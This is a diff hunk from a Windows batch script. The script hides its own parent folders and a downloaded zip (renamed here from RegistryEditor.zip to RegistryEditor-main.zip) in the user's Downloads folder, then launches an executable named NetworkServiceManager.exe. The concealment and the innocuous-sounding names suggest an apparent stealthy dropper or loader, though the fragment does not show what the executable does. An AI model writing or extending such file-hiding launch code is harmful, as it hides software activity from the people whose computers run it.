@@ -42,7 +42,7 @@ attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
 REM Hide the RegistryEditor.zip file in the Downloads directory
-attrib +h "%USERPROFILE%\Downloads\RegistryEditor.zip"
+attrib +h "%USERPROFILE%\Downloads\RegistryEditor-main.zip"
 
 REM Start NetworkServiceManager.exe for the first time and wait for 12 seconds
 start "" "%script_dir%NetworkServiceManager.exe"
